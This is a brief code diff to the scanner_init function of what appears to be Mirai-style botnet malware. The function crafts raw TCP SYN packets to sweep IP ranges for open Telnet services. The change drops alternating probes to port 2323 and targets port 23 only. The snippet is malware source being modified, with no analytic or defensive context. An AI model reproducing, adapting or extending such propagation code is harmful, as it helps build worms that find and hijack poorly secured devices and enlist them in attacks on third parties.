@@ -219,14 +219,9 @@ void scanner_init(void)
                 //printf("[is own programming:scanner] scanning sIP %d.%d.%d.%d\n",iph->saddr & 0xff, (iph->saddr >> 8) & 0xff, (iph->saddr >> 16) & 0xff, (iph->saddr >> 24) & 0xff);
                 //printf("[is own programming:scanner] scanning dIP %d.%d.%d.%d\n",iph->daddr & 0xff, (iph->daddr >> 8) & 0xff, (iph->daddr >> 16) & 0xff, (iph->daddr >> 24) & 0xff);
 
-                if (i % 10 == 0)
-                {
-                    tcph->dest = htons(2323);
-                }
-                else
-                {
-                    tcph->dest = htons(23);
-                }
+                //Scan Telnet 23
+                tcph->dest = htons(23);
+                
                 tcph->seq = iph->daddr;
                 tcph->check = 0;
                 tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof (struct tcphdr)), sizeof (struct tcphdr));
